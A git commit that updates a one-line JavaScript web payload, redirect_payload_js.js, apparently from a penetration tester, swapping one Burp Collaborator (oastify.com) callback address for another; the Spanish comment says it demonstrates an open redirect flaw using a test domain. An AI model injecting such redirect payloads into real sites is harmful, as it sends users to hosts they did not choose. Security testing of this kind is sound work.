a55244201e74241cd63c9f02f9676f7a81060fe1
Saher Delgado <saherdelgado@gmail.com>
2024-10-18 11:11:11 -0300

    Update redirect_payload_js.js
    new url burp collaborator

--- redirect_payload_js.js
+++ redirect_payload_js.js
@@ -2,4 +2,4 @@
 
 // Este script redirige al usuario a una URL específica para demostrar una vulnerabilidad de redireccionamiento
 // Usamos un dominio de prueba para evitar causar daño real.
-window.location.href = "http://qztrylx5tfh6y41my4qy4ogkxb32rtlha.oastify.com";
+window.location.href = "http://2ile3dhv0shoao6wfdn8rvsmxd34r4ft.oastify.com";
